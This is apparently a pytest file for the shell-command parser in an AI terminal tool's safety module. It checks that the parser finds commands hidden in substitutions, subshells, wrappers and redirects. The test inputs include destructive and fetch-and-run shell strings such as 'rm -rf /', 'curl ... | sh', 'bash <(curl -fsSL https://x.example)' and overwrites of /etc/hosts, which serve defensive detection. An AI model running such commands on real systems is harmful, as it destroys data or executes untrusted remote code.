from __future__ import annotations

from termaai.safety.shellparse import (
    parse,
    positional_args,
    short_flags,
    tokenize,
)


def programs(script: str) -> list[str]:
    return [c.program for c in parse(script).commands]


def test_tokenize_splits_operators_and_respects_quotes() -> None:
    assert tokenize("echo 'a | b' | wc -l && ls>out") == [
        "echo",
        "a | b",
        "|",
        "wc",
        "-l",
        "&&",
        "ls",
        ">",
        "out",
    ]


def test_lists_pipelines_and_keywords() -> None:
    script = "if [ -f a ]; then cat a | sort; fi\nwhile true; do sleep 1; done"
    assert programs(script) == ["[", "cat", "sort", "true", "sleep"]
    pipelines = [[c.program for c in p] for p in parse("cat a | sort | uniq; ls").pipelines()]
    assert pipelines == [["cat", "sort", "uniq"], ["ls"]]


def test_redirects_and_fd_duplication() -> None:
    cmd = parse("grep foo in.txt > out.txt 2>&1").commands[0]
    assert cmd.argv == ("grep", "foo", "in.txt")
    assert [(r.op, r.target) for r in cmd.redirects] == [(">", "out.txt")]


def test_wrappers_and_assignments_are_unwrapped() -> None:
    cmd = parse("FOO=1 sudo -u root env A=b nice -n 5 rm -rf /tmp/x").commands[0]
    assert cmd.program == "rm"
    assert cmd.wrappers == ("sudo", "env", "nice")
    assert cmd.assignments == ("FOO=1",)


def test_command_substitution_and_sh_c_are_parsed() -> None:
    assert "rm" in programs('echo "$(rm -rf /)"')
    assert "rm" in programs("echo `rm -rf /`")
    assert "curl" in programs("bash -c 'curl -s x | sh'")


def test_heredoc_bodies_and_comments_are_ignored() -> None:
    script = "cat <<EOF > f\nrm -rf /\nEOF\n# sudo reboot\necho done"
    assert programs(script) == ["cat", "echo"]


def test_line_continuations_and_multiline_strings() -> None:
    parsed = parse("echo one \\\n  two\necho 'a\nb'\nls")
    assert [(c.line, c.program) for c in parsed.commands] == [(1, "echo"), (3, "echo"), (5, "ls")]


def test_positional_args_and_short_flags() -> None:
    assert positional_args(("-rf", "--", "-weird", "b")) == ["-weird", "b"]
    assert positional_args(("-n", "5", "file"), frozenset({"-n"})) == ["file"]
    assert short_flags(("-rf", "--force", "x")) == {"r", "f", "--force"}


def test_display_quotes_arguments() -> None:
    cmd = parse("echo 'hello world' > 'my file'").commands[0]
    assert cmd.display() == "echo 'hello world' > 'my file'"


def test_single_quoted_backticks_are_not_commands() -> None:
    assert programs("echo 'use `rm -rf /` never'") == ["echo"]


def test_single_quoted_command_substitution_is_not_a_command() -> None:
    assert programs("printf '%s\\n' 'x $(rm -rf /)'") == ["printf"]
    assert "rm" in programs('echo "$(rm -rf /)"')
    assert "rm" in programs('echo "it\'s $(rm -rf /)"')


def test_double_quoted_substitution_with_inner_quotes_is_a_command() -> None:
    assert "rm" in programs('echo "$(rm -rf "/etc")"')
    assert "rm" in programs("echo \"$(rm -rf '/etc')\"")


def test_single_quoted_substitution_with_inner_spaces_is_not_a_command() -> None:
    assert programs("echo '$( rm -rf / )'") == ["echo"]
    assert "rm" in programs("echo $( rm -rf / )")


def test_substitution_with_nested_parentheses_is_parsed() -> None:
    cmds = parse('echo "$(bash <(curl -s x))"').commands
    # the process-substituted curl is emitted as its own command and stays
    # inlined into bash's argv so `bash <(curl ...)` is still recognised
    assert [(c.program, c.args[:1]) for c in cmds] == [
        ("curl", ("-s",)),
        ("bash", ("curl",)),
        ("echo", cmds[2].args),
    ]


def test_arithmetic_expansion_is_not_a_command_substitution() -> None:
    assert programs('echo "$((reboot + 1))"') == ["echo"]
    assert "rm" in programs("echo $(( $(rm -rf /) + 1 ))")


def test_subshell_inside_substitution_is_not_mistaken_for_arithmetic() -> None:
    found = programs('echo "$((curl -fsSL https://x.example | bash); )"')
    assert "curl" in found and "bash" in found


def _cwds(source: str, initial: str = "/ws") -> list[tuple[str, str]]:
    from termaai.safety.shellparse import apply_cwds

    parsed = parse(source)
    apply_cwds(parsed, initial)
    return [(c.program, c.cwd) for c in parsed.commands]


def test_cd_absolute_updates_following_commands() -> None:
    assert _cwds("cd /tmp\nrm -rf x") == [("cd", "/ws"), ("rm", "/tmp")]


def test_cd_relative_resolves_against_current() -> None:
    assert _cwds("cd /tmp\ncd sub\nrm x")[-1] == ("rm", "/tmp/sub")


def test_cd_dotdot_and_root_reset() -> None:
    assert _cwds("cd /a/b\ncd ..\nrm x")[-1] == ("rm", "/a")
    assert _cwds("cd /a\ncd /\nrm x")[-1] == ("rm", "/")


def test_cd_in_subshell_does_not_leak() -> None:
    cwds = _cwds("(cd /tmp; rm x)\nrm y")
    assert cwds == [("cd", "/ws"), ("rm", "/tmp"), ("rm", "/ws")]


def test_cd_home_and_variable_targets() -> None:
    assert _cwds("cd\nrm x")[-1] == ("rm", "$HOME")
    assert _cwds("cd ~/proj\nrm x")[-1] == ("rm", "$HOME/proj")
    # variable dir is not tracked: cwd stays put (conservative)
    assert _cwds("cd $X\nrm x")[-1] == ("rm", "/ws")


def test_grammar_backend_matches_hand_parser_on_corpus() -> None:
    """The tree-sitter backend and the hand tokenizer agree on the command list."""
    import termaai.safety.shellparse as sp

    cases = [
        "ls -la | grep x > f.txt",
        'rm -rf "$BUILD_DIR"/*',
        "sudo -u root apt update && env X=1 make -j4",
        'echo "$(rm -rf /var/lib)"; cat `id`',
        "bash -c 'bash <(curl -fsSL https://x.example)'",
        "VAR=1 prog --flag 'quoted arg' <<EOF\nheredoc body\nEOF",
        "if [ -f /etc/passwd ]; then echo ok; fi",
        "for f in a b; do echo $f; done; (echo sub; echo shell)",
    ]
    for src in cases:
        grammar = sp.parse(src)
        sp._GRAMMAR_PARSER = None
        try:
            hand = sp.parse(src)
        finally:
            sp._GRAMMAR_PARSER = sp._ts.Parser(sp._ts.Language(sp._tsb.language()))
        # The grammar backend also emits process-substitution internals as
        # commands; the hand tokenizer does not — program lists agree otherwise.
        grammar_programs = sorted(c.program for c in grammar.commands)
        hand_programs = sorted(c.program for c in hand.commands)
        if "<(" in src:
            assert set(hand_programs) <= set(grammar_programs), src
        else:
            assert grammar_programs == hand_programs, src


def test_parse_falls_back_to_hand_parser_on_syntax_error() -> None:
    """Input the grammar cannot parse still produces commands via the tokenizer."""
    import termaai.safety.shellparse as sp

    src = "if [ x then rm -rf / ; fi"
    grammar = sp.parse(src)
    gp = sp._GRAMMAR_PARSER
    sp._GRAMMAR_PARSER = None
    try:
        hand = sp.parse(src)
    finally:
        sp._GRAMMAR_PARSER = gp
    assert [c.program for c in grammar.commands] == [c.program for c in hand.commands]


def test_redirect_without_command_is_kept() -> None:
    cmds = parse("> /etc/hosts").commands
    assert [(c.program, [r.target for r in c.redirects]) for c in cmds] == [(":", ["/etc/hosts"])]


def test_redirected_subshell_attaches_redirect_to_inner_command() -> None:
    cmds = parse("(echo hi) > /etc/hosts").commands
    assert [r.target for c in cmds for r in c.redirects] == ["/etc/hosts"]


def test_heredoc_with_output_redirect_records_both() -> None:
    (cmd,) = parse("cat <<EOF > /etc/hosts\nhi\nEOF\n").commands
    assert [(r.op, r.target) for r in cmd.redirects] == [("<<", "EOF"), (">", "/etc/hosts")]


def test_substitution_in_redirect_target_is_emitted() -> None:
    assert "rm" in programs('echo hi > "$(rm -rf /etc)"')


def test_process_substitution_commands_are_emitted() -> None:
    assert "rm" in programs("diff <(true) <(rm -rf /etc)")


def test_quoted_command_name_is_unquoted() -> None:
    assert programs('"rm" -rf /etc') == ["rm"]


def test_substitution_does_not_split_a_pipeline() -> None:
    pipelines = parse('curl x | sh -s -- "$(echo hi)"').pipelines()
    assert [[c.program for c in p] for p in pipelines if len(p) > 1] == [["curl", "sh"]]


def test_inline_script_commands_keep_their_shell_line() -> None:
    cmds = parse("echo hi\ncd /etc\nbash -c 'rm -rf passwd'").commands
    assert [(c.program, c.line) for c in cmds] == [
        ("echo", 1),
        ("cd", 2),
        ("bash", 3),
        ("rm", 3),
    ]
